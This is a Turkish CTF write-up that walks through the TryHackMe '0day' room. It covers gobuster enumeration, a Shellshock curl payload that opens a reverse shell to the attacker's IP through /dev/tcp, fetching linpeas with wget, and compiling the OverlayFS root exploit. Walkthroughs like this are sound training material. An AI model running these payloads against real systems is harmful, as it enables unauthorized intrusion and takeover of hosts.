# THM-0day_Writeup-TR-
# TryHackMe 0day CTF Çözümü

1- Nmap taramasıyla baslayalim. <br>
![Nmap](Pictures/1.png) <br>
2- Port 22 ve 80 calisiyor. <br>
![web](Pictures/2.png) <br>
3- Web sitesi bu sekilde. Görünürde bir sey yok. <br>
![Gobuster](Pictures/3.png) <br>
4- Gobuster ile dizin taramasi yapalim. Tarama sonuçlarına göre, incelememiz gereken en önemli yer /cgi-bin dizinidir. <br>
5- /cgi-bin altinda tekrar gobuster calistiralim.
![Gobuster](Pictures/4.png) <br>
6- /cgi-bin/test.cgi dosyasi, Shellshock (CVE-2014-6271) zafiyetini sömürmek için ideal bir hedef. <br>
7- Port dinleme adimina gecelim. nc -nvlp 4444 komutuyla port dinleyeceğiz. <br>
![Netcat](Pictures/5.png) <br>
8- Baska bir terminal acip payload'umuzu calistiralim. <br>
9- curl -A '() { :; }; /bin/bash -i >& /dev/tcp/10.23.200.7/4444 0>&1' http://10.10.237.144/cgi-bin/test.cgi <br>
![Payload](Pictures/6.png) <br>
10- Reverse Shell basarili. <br>
![Shell](Pictures/7.png) <br>
11- python -c 'import pty; pty.spawn("/bin/bash")' komutuyla Shell'imizi geliştirelim. <br>
12- cd /home komutuyla gidip ls yaptigimizda ryan dosyasinin içinde user.txt gorecegiz, bu bizim user flag'imiz. <br>
![UserFlag](Pictures/8.png) <br>
13- User flag: THM{Sh3l[SANSURLENDI]ckz} <br>
![cm](Pictures/9.png) <br>
14- uname -a komutunu girelim. <br>
15- "Kernel Versiyonu: 3.13.0-32-generic" Bu eski çekirdek versiyonu, özellikle 2014-2015 yılları arasında popüler olan ve yetki yükseltmeye izin veren birden fazla Kernel Exploit'ine karşı son derece zafiyetlidir. <br>
16- Yapmak istedigimiz, bu zafiyetli cekirdek için yazilmis hazır bir C exploit kodunu kendi makinemizden hedef makineye aktarmak, derlemek ve çalıştırmak olacaktır. Deneyelim <br>
17- Google'da ilgili exploit'i arastirdigimizda payload'lar goruyoruz herhangi birini kullanabilirsiniz. <br>
![exp](Pictures/10.png) <br>

![PythonServer](Pictures/11.png) <br>
19- Dosyamizi hedefe atmak için python server acalim. <br>
<b>NOT: MAKINE TERMINATE OLDU IP ADRESI DEGISTI, AKLINIZ KARISMASIN.</b> <br>
20- wget http://10.23.200.7:8000/linpeas.sh ile linpeas.sh'i hedef makinemize indirelim /tmp klasörü içine olacak sekilde. <br>
21- chmod +x linpeas.sh ile calistirma yetkisi verelim. <br>
![Linpeas](Pictures/12.png) <br>
22- Linpeas'i calistirdik. "Executing Linux Exploit Suggester" bölümü kritik bilgiler veriyor. <br>
23- LinPEAS, zafiyet tespitinde en guvenilir yolu teyit etti: OverlayFS (CVE-2015-1328). <br>
24- https://www.exploit-db.com/exploits/37292 adresinden dosyayi indirelim. Sonra wget <LOCAL-IP>/37292.c ile hedef makinede calistirarak indirelim. (/tmp içine) <br>
25- Bu komutu calistiralim: gcc 37292.c -o exploit && ./exploit <br>
<b>NOT: HATA ALIRSANIZ CALISTIRIN: export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ardindan tekrar gcc 37292.c -o exploit && ./exploit</b> <br>
![PE](Pictures/14.png) <br>
26- Goruldugu uzere root olduk. <br>
27- /root/root.txt yollarini izleyerek root flag'i aliyoruz. <br>
![RootFlag](Pictures/15.png) <br>
28- Root flag'i aldik. Tebrik ederim. <br>
![Finish](Pictures/16.png) <br>

<b>Okuduğunuz için teşekkür ederim. https://www.linkedin.com/in/albora-dogan-deniz-4a56a21b8/</b>







